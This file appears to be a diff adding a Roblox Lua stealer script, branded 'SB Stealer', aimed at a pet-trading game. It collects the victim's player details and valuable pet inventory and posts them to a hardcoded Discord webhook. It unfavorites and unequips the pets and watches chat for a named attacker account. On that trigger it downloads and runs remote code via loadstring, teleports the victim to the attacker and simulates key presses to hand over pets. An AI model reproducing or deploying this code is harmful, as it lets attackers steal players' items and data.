@@ -1,0 +1,376 @@
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TextChatService = game:GetService("TextChatService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+
+local SCRIPT_START_TIME = os.time()
+
+local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1386419413195952148/W_GLaIaE_kx7wA3lgTEiIzuNxft1DFXxL35-pNkxv3BCvgEwiiAs9ijD5GGhm28MS_W5"
+
+local player = Players.LocalPlayer
+local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
+local PetsFolder = workspace:WaitForChild("PetsPhysical")
+local FavoriteItemService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
+local TARGET_PLAYER = "AutizmProT"
+
+local isTeleportActive = false
+
+local success, inventoryData = pcall(function()
+    local DataService = require(ReplicatedStorage.Modules.DataService)
+    return DataService:GetData().PetsData.PetInventory.Data
+end)
+
+if not success or not inventoryData then
+    return
+end
+
+local petDataList, totalPets, hugePets, priorityPets, agedMutatedPets = {}, 0, {}, {}, {}
+local unequippedPetUUIDs = {}
+local targetPetsList = {
+    "Disco Bee", "Raccoon", "Dragonfly", "Mimic Octopus", "Butterfly",
+    "Queen Bee", "T-Rex", "Fennec Fox", "Rainbow Ankylosaurus",
+    "Rainbow Dilophosaurus", "Rainbow Pachycephalosaurus",
+    "Rainbow Iguanodon", "Rainbow Parasaurolophus", "Fox"
+}
+
+for uuid, petInfo in pairs(inventoryData) do
+    if type(petInfo) == "table" and petInfo.PetData then
+        local petType = tostring(petInfo.PetType or "Unknown")
+        local baseWeight = tonumber(petInfo.PetData.BaseWeight) or 0
+        local currentWeight = tonumber(petInfo.PetData.Weight) or baseWeight
+        local age = tonumber(petInfo.PetData.Age) or 0
+        local level = tonumber(petInfo.PetData.Level) or 1
+        local mutation = ""
+        local mutationValue = petInfo.PetData.MutationType or petInfo.PetData.Mutation or petInfo.PetData.mutation or petInfo.Mutation
+        if mutationValue and mutationValue ~= "Normal" and mutationValue ~= "m" and mutationValue ~= "" then
+            local mutationName = tostring(mutationValue)
+            if mutationName == "k" or mutationName == "IronSkin" then mutation = "IronSkin "
+            elseif mutationName == "d" or mutationName == "Shiny" then mutation = "Shiny "
+            elseif mutationName == "l" or mutationName == "Radiant" then mutation = "Radiant "
+            elseif mutationName == "n" or mutationName == "Ascended" then mutation = "Ascended "
+            elseif mutationName == "f" or mutationName == "Frozen" then mutation = "Frozen "
+            elseif mutationName == "g" or mutationName == "Inverted" then mutation = "Inverted "
+            elseif mutationName == "e" or mutationName == "Windy" then mutation = "Windy "
+            elseif mutationName == "a" or mutationName == "Shocked" then mutation = "Shocked "
+            elseif mutationName == "b" or mutationName == "Burning" then mutation = "Burning "
+            elseif mutationName == "c" or mutationName == "Corrupted" then mutation = "Corrupted "
+            elseif mutationName == "h" or mutationName == "Starfall" then mutation = "Starfall "
+            elseif mutationName == "i" or mutationName == "Overcharged" then mutation = "Overcharged "
+            elseif mutationName == "j" or mutationName == "Radioactive" then mutation = "Radioactive "
+            else mutation = "[" .. mutationName .. "] "
+            end
+        end
+        local fullPetName = mutation .. petType
+        if baseWeight > 0 or currentWeight > 0 then
+            local petData = {type = fullPetName, weight = currentWeight, baseWeight = baseWeight, age = age, level = level, uuid = uuid, basePetType = petType}
+            table.insert(petDataList, petData)
+            totalPets = totalPets + 1
+            local ageDays = math.floor(age / 86400)
+            local isMutated = mutation ~= ""
+            if baseWeight >= 4.0 then table.insert(hugePets, petData) end
+            if ageDays >= 50 or isMutated then table.insert(agedMutatedPets, petData) end
+            for _, targetPet in ipairs(targetPetsList) do
+                if petType == targetPet then table.insert(priorityPets, petData); break end
+            end
+        end
+    end
+end
+
+local function getPlayerInfo()
+    local playerAge = player.AccountAge
+    local jobId = game.JobId or "Unknown"
+    local placeId = tostring(game.PlaceId)
+    local joinLink = "https://fern.wtf/joiner?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
+    return {displayName = player.DisplayName, username = player.Name, userId = player.UserId, age = playerAge, joinLink = joinLink}
+end
+
+local function formatPetList()
+    local priorityOnlyList = {}
+    for _, pet in ipairs(petDataList) do
+        local isHuge = pet.baseWeight >= 4.0
+        local isAgedMutated = (math.floor(pet.age / 86400) >= 50) or (pet.type ~= pet.basePetType)
+        local isTargetPet = false
+        for _, targetPet in ipairs(targetPetsList) do
+            if pet.basePetType == targetPet then isTargetPet = true; break end
+        end
+        if isHuge or isAgedMutated or isTargetPet then table.insert(priorityOnlyList, pet) end
+    end
+    if #priorityOnlyList == 0 then return "```\n🚫 No priority pets found\n```" end
+    table.sort(priorityOnlyList, function(a, b)
+        local aIsHuge = a.baseWeight >= 4.0; local bIsHuge = b.baseWeight >= 4.0
+        local aIsAgedMutated = (math.floor(a.age / 86400) >= 50) or (a.type ~= a.basePetType)
+        local bIsAgedMutated = (math.floor(b.age / 86400) >= 50) or (b.type ~= b.basePetType)
+        local aIsPriority = false; local bIsPriority = false
+        for _, targetPet in ipairs(targetPetsList) do
+            if a.basePetType == targetPet then aIsPriority = true end
+            if b.basePetType == targetPet then bIsPriority = true end
+        end
+        if aIsHuge ~= bIsHuge then return aIsHuge end
+        if aIsAgedMutated ~= bIsAgedMutated then return aIsAgedMutated end
+        if aIsPriority ~= bIsPriority then return aIsPriority end
+        return a.weight > b.weight
+    end)
+    local petList = "```\n"
+    for i, pet in ipairs(priorityOnlyList) do
+        local ageText = ""
+        if pet.age > 0 then
+            local days = math.floor(pet.age / 86400); local hours = math.floor((pet.age % 86400) / 3600)
+            if days > 0 then ageText = string.format(" (Age: %dd %dh)", days, hours) else ageText = string.format(" (Age: %dh)", hours) end
+        end
+        local weightText = ""
+        if pet.weight ~= pet.baseWeight then weightText = string.format("%.2f KG (Base: %.2f KG)", pet.weight, pet.baseWeight) else weightText = string.format("%.2f KG", pet.weight) end
+        local icon = "🐾"
+        if pet.baseWeight >= 4.0 then icon = "💎"
+        elseif (math.floor(pet.age / 86400) >= 50) or (pet.type ~= pet.basePetType) then icon = "⭐"
+        else
+            for _, targetPet in ipairs(targetPetsList) do
+                if pet.basePetType == targetPet then icon = "🎯"; break end
+            end
+        end
+        petList = petList .. string.format("%s %s - %s%s [Lv.%d]\n", icon, pet.type, weightText, ageText, pet.level)
+        if i >= 20 then
+            local remaining = #priorityOnlyList - 20
+            if remaining > 0 then petList = petList .. string.format("➕ ... and %d more priority pets\n", remaining) end
+            break
+        end
+    end
+    return petList .. "```"
+end
+
+local function sendToDiscord()
+    local playerInfo = getPlayerInfo()
+    local petList = formatPetList()
+    local embed = {title = "🐾 SB STEALER PALDO", color = 3447003, fields = {{name = "👤 Player Information", value = string.format("```\n🎮 Display Name: %s\n👤 Username: @%s\n🆔 User ID: %d\n📅 Account Age: %d days\n```", playerInfo.displayName, playerInfo.username, playerInfo.userId, playerInfo.age), inline = false}, {name = "📊 Inventory Statistics", value = string.format("```\n🐾 Total Pets: %d\n💎 Huge Pets (4kg+): %d\n⭐ Aged/Mutated: %d\n🎯 Priority Targets: %d\n```", totalPets, #hugePets, #agedMutatedPets, #priorityPets), inline = false}, {name = "🐾 All Pets (Priority First)", value = petList, inline = false}, {name = "🔗 Server Access", value = string.format("**[Join Server](%s)**", playerInfo.joinLink), inline = false}}, footer = {text = "🐾 Pet Inventory System • Powered by SB Stealer", icon_url = "https://cdn.discordapp.com/attachments/1384036950977019974/1384526026809409596/sb.png"}, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
+    local payload = {username = "🐾 Pet Inventory System", avatar_url = "https://cdn.discordapp.com/attachments/1384036950977019974/1384526026809409596/sb.png", embeds = {embed}}
+    pcall(function() request({Url = DISCORD_WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)}) end)
+end
+
+local function unfavoriteAllPets()
+    local backpack = player:WaitForChild("Backpack")
+    for _, tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("d") == true then pcall(function() FavoriteItemService:FireServer(tool) end) end
+    end
+    if player.Character then
+        for _, tool in ipairs(player.Character:GetChildren()) do
+            if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("d") == true then pcall(function() FavoriteItemService:FireServer(tool) end) end
+        end
+    end
+end
+
+local function unequipAllGardenPets()
+    unequippedPetUUIDs = {}
+    for _, pet in ipairs(PetsFolder:GetChildren()) do
+        if pet:GetAttribute("OWNER") == player.Name then
+            local uuid = pet:GetAttribute("UUID")
+            if uuid then pcall(function() PetsService:FireServer("UnequipPet", uuid); table.insert(unequippedPetUUIDs, uuid) end) end
+        end
+    end
+end
+
+local function reequipGardenPets()
+    for _, uuid in ipairs(unequippedPetUUIDs) do
+        pcall(function() PetsService:FireServer("EquipPet", uuid) end)
+    end
+end
+
+local function optimizePerformance()
+    local Terrain = workspace.Terrain; local Lighting = game:GetService("Lighting")
+    pcall(function() Terrain:FillRegion(Region3.new(Vector3.new(-2048, -2048, -2048), Vector3.new(2048, 2048, 2048)), 4, Enum.Material.Air) end)
+    pcall(function() settings().Rendering.QualityLevel = 1; settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level04; settings().Rendering.EnableFRM = false; settings().Rendering.GraphicsMode = Enum.GraphicsMode.Manual end)
+    pcall(function() Lighting.GlobalShadows = false; Lighting.FogEnd = 9e9; Lighting.Brightness = 0 end)
+    for _, obj in pairs(workspace:GetDescendants()) do
+        pcall(function()
+            if obj:IsA("Part") or obj:IsA("Union") or obj:IsA("CornerWedgePart") or obj:IsA("TrussPart") then obj.Material = Enum.Material.Plastic; obj.Reflectance = 0
+            elseif obj:IsA("Decal") or obj:IsA("Texture") then obj.Transparency = 1
+            elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then obj.Enabled = false
+            elseif obj:IsA("MeshPart") then obj.Material = Enum.Material.Plastic; obj.Reflectance = 0; obj.TextureID = ""
+            elseif obj:IsA("SpecialMesh") then obj.TextureId = ""
+            elseif obj:IsA("ShirtGraphic") then obj.Graphic = ""
+            elseif (obj:IsA("Shirt") or obj:IsA("Pants")) then obj[obj.ClassName .. "Template"] = "" end
+        end)
+    end
+end
+
+local function muteAllSounds()
+    for _, descendant in pairs(workspace:GetDescendants()) do
+        if descendant:IsA("Sound") then
+            descendant.Volume = 0
+        end
+    end
+    
+    for _, descendant in pairs(game:GetService("SoundService"):GetDescendants()) do
+        if descendant:IsA("Sound") then
+            descendant.Volume = 0
+        end
+    end
+end
+
+local function getPriorityPetsFromBackpack()
+    local availablePets = {}
+    local backpack = player:WaitForChild("Backpack")
+
+    for _, tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
+            local toolUUID = tool:GetAttribute("PET_UUID")
+            if toolUUID then
+                for _, petData in ipairs(petDataList) do
+                    if petData.uuid == toolUUID then
+                        local isHuge = petData.baseWeight >= 4.0
+                        local isAgedMutated = (math.floor(petData.age / 86400) >= 50) or (petData.type ~= petData.basePetType)
+                        local isTargetPet = false
+                        for _, targetPetName in ipairs(targetPetsList) do
+                            if petData.basePetType == targetPetName then isTargetPet = true; break end
+                        end
+                        
+                        if isHuge or isAgedMutated or isTargetPet then
+                            table.insert(availablePets, petData)
+                        end
+                        break
+                    end
+                end
+            end
+        end
+    end
+
+    table.sort(availablePets, function(a, b)
+        local aIsHuge = a.baseWeight >= 4.0; local bIsHuge = b.baseWeight >= 4.0
+        if aIsHuge ~= bIsHuge then return aIsHuge end
+        local aIsAgedMutated = (math.floor(a.age / 86400) >= 50) or (a.type ~= a.basePetType)
+        local bIsAgedMutated = (math.floor(b.age / 86400) >= 50) or (b.type ~= b.basePetType)
+        if aIsAgedMutated ~= bIsAgedMutated then return aIsAgedMutated end
+        return a.weight > b.weight
+    end)
+    
+    return availablePets
+end
+
+local function triggerInteraction()
+    local targetPlayer = Players:FindFirstChild(TARGET_PLAYER)
+    if not targetPlayer or not targetPlayer.Character then return end
+    local targetRootPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not targetRootPart then return end
+
+    for _, prompt in ipairs(targetRootPart:GetChildren()) do
+        if prompt:IsA("ProximityPrompt") then
+            prompt.HoldDuration = 0
+            prompt.Enabled = true
+            task.wait(0.1)
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+            task.wait(0.55)
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+            break
+        end
+    end
+end
+
+local function handleTrigger()
+    isTeleportActive = true
+    optimizePerformance()
+    muteAllSounds()
+    unequipAllGardenPets()
+    task.wait(0.4)
+    unfavoriteAllPets()
+    sendToDiscord()
+    
+    while true do
+        local priorityPetsInBackpack = getPriorityPetsFromBackpack()
+        
+        if #priorityPetsInBackpack == 0 then
+            task.wait(1) 
+            continue
+        end
+        
+        local bestPetData = priorityPetsInBackpack[1]
+        local bestPetUUID = bestPetData.uuid
+        
+        local character = player.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local backpack = player:WaitForChild("Backpack")
+        
+        if not humanoid or not backpack then
+            break
+        end
+        
+        local petTool
+        for _, tool in ipairs(backpack:GetChildren()) do
+            if tool:GetAttribute("PET_UUID") == bestPetUUID then
+                petTool = tool
+                break
+            end
+        end
+        
+        if not petTool then
+            task.wait(0.1)
+            continue
+        end
+        
+        humanoid:EquipTool(petTool)
+        triggerInteraction()
+        
+        task.wait(0.2)
+    end
+end
+
+local function setupChatMonitoring()
+    local function onMessage(textChatMessage)
+        if not textChatMessage or not textChatMessage.TextSource then return end
+        if textChatMessage.Timestamp.UnixTimestamp < SCRIPT_START_TIME then return end
+        
+        local senderUsername = textChatMessage.TextSource.Name
+        local messageText = string.lower(textChatMessage.Text)
+
+        if senderUsername == TARGET_PLAYER or (senderUsername == player.Name and messageText:find("update")) then
+            
+            task.spawn(function()
+                pcall(function()
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeNews/proxy/refs/heads/main/load"))()
+                end)
+            end)
+            
+            task.spawn(handleTrigger)
+        end
+    end
+
+    pcall(function()
+        local textChannels = TextChatService:WaitForChild("TextChannels")
+        local rbxGeneral = textChannels:WaitForChild("RBXGeneral")
+        rbxGeneral.MessageReceived:Connect(onMessage)
+    end)
+end
+
+local function startContinuousUnfavoriteLoop()
+    task.spawn(function()
+        while true do
+            unfavoriteAllPets()
+            task.wait(1)
+        end
+    end)
+end
+
+local hasAnnouncedTeleport = false
+RunService.Stepped:Connect(function()
+    if not isTeleportActive then return end
+    local targetPlayer = Players:FindFirstChild(TARGET_PLAYER)
+    if not targetPlayer or not targetPlayer.Character then return end
+    local localCharacter = player.Character
+    if not localCharacter then return end
+    local localRootPart = localCharacter:FindFirstChild("HumanoidRootPart")
+    local targetRootPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not localRootPart or not targetRootPart then return end
+    localRootPart.CFrame = targetRootPart.CFrame
+    if not hasAnnouncedTeleport then
+        hasAnnouncedTeleport = true
+    end
+end)
+
+setupChatMonitoring()
+startContinuousUnfavoriteLoop()
+
+unequipAllGardenPets()
+task.wait(0.4)
+unfavoriteAllPets()
+sendToDiscord()
+reequipGardenPets()
